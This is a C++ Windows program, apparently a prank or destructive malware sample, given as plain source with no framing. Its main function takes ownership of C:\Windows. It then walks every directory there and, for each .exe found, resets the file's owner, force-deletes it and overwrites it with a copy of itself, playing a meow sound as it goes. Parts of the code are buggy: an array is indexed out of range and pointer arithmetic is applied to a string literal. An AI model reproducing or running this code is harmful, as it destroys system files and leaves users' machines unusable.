#include <windows.h>
#include <string>
#include <iostream>
#include <array>
#include <mmsystem.h>
#include <accctrl.h>
#include <aclapi.h>
#pragma comment( lib, "Winmm.lib" )
using namespace std;
string sWords[] = {"Lol","Mitze","Katze"};
string Chain = "";
void FckFiles(std::string directory, std::string fileFilter, bool recursively = true)
{
	if (recursively)
		FckFiles(directory, fileFilter, false);
	directory += "\\";
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	std::string filter = directory + (recursively ? "*" : fileFilter);
	hFind = FindFirstFile(filter.c_str(), &FindFileData);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		return;
	}
	else
	{
		if (!recursively)
		{
			Chain = Chain + sWords[rand() % 4];
			//cout << Chain;
			string Chickfila = directory + std::string(FindFileData.cFileName);
			CopyFile("C:\\mitze.exe",Chickfila.c_str(),0);
			rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
		}
		while (FindNextFile(hFind, &FindFileData) != 0)
		{
			if (!recursively)
			{
				Chain = Chain + sWords[rand() % 4];
				cout << Chain;
				string Chickfila = directory + std::string(FindFileData.cFileName);
				mciSendString("play meow.mp3", NULL, 0, NULL);
				string Dutter = "del /f  "+ string(Chickfila);
				string Butter = "copy C:\\mitze.exe /Y "+ string(Chickfila);
				const char* Sucker2 = Dutter.c_str();
				const char* Sucker3 = Butter.c_str();
				system(("icacls " + string(Chickfila) + " /setowner \"Administrators\" /T /C").c_str());
				system(("del /f  "+ string(Chickfila)).c_str());
				system(("copy C:\\mitze.exe /Y "+ string(Chickfila)).c_str());
				rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
			}
			else
			{
				if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)>0 && FindFileData.cFileName[0]!='.')
				{
					FckFiles(directory + std::string(FindFileData.cFileName), fileFilter);
				}
			}
		}
		DWORD dwError = GetLastError();
		FindClose(hFind);
		if (dwError != ERROR_NO_MORE_FILES)
		{
			std::cout << "FindNextFile error. Error is "<< dwError << std::endl;
		}
	}
}
int main(int argc, char* argv[])
{
    // assigning value to string s 
    string abc = "abcdefghijklmnopqrstuvwxyz"; 
    char char_array[abc.length() + 1]; 
    strcpy(char_array, abc.c_str()); 
	system("takeown /f C:\\Windows");
	CopyFile("./a.exe","C:/mitze.exe",0);
	CopyFile("./meow.mp3","C:/meow.mp3",0);
	for(int i=0;i<abc.length();i++){

		FckFiles("C:\\Windows","*.exe");
	}

}